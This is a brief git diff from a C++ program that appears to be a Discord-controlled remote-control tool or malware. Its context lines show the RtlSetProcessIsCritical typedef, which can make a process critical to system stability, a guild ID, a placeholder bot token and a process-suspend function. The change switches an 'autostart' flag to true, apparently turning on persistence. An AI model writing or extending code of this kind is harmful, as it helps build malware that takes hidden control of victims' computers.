@@ -25,7 +25,7 @@ typedef NTSTATUS(WINAPI* RtlSetProcessIsCritical)(BOOLEAN NewValue, BOOLEAN* Old
 //shit to change
 const long long int guildId = 1234323423423; // serverid
 const std::string BOT_TOKEN = "discord-token";  // please dont fuck my shit up :( ima change this before it i release or not idk if ill remember
-const bool autostart = false;
+const bool autostart = true;
 
 // creates channel at startup and defines functions
 void suspend(const std::string& processName);
